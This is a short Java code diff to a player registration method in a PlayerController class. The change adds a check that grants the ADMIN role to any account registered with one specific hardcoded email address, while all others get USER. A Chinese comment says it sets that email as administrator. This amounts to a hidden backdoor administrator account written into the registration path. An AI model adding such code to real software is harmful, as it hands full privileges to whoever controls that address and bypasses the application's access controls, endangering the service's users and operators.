@@ -165,7 +165,12 @@ public class PlayerController {
         player.setName(name);
         player.setEmail(email);
         player.setPassword(passwordEncoder.encode(password));
-        player.setRole(UserRole.USER);
+        // SPDNet: 特定邮箱注册时设置为管理员
+        if ("3047354896@qq.com".equals(email)) {
+            player.setRole(UserRole.ADMIN);
+        } else {
+            player.setRole(UserRole.USER);
+        }
         player.setCreatedAt(LocalDateTime.now());
 
         playerRepository.save(player);
